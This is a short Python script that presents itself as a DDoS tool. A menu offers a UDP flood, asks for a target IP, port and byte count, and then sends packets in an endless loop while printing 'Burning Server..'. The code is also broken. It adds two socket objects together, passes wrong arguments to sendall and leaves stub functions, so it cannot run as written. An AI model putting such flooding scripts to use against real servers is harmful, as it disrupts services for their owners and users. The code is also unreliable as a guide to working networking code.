import socket
import time
import sys
import os
import argparse
import requests

red = '\033[1;91m'
blue = '\033[1;34m'
green = '\033[1;32m'
time.sleep(0.5)
print(f'{red}DDOS WITH 7 LAYER')
print(f'{green}1. UDP')
choice = input('Select Methods : ')

if choice == ('1'):
    pass
    trgt = input(f'IP Target : ')
    port = input(f'Port : ')
    
    while True:
        try:
           bytes = input('Bytes : ')
           send = 5000
        except KeyboardInterrupt:
            exit()
        def destroy(trgt, port):
            pass
        while True:
            pass
            udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            udp2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            up = udp + udp2
            up.sendall(bytes, (trgt, port))
            print('Burning Server..')
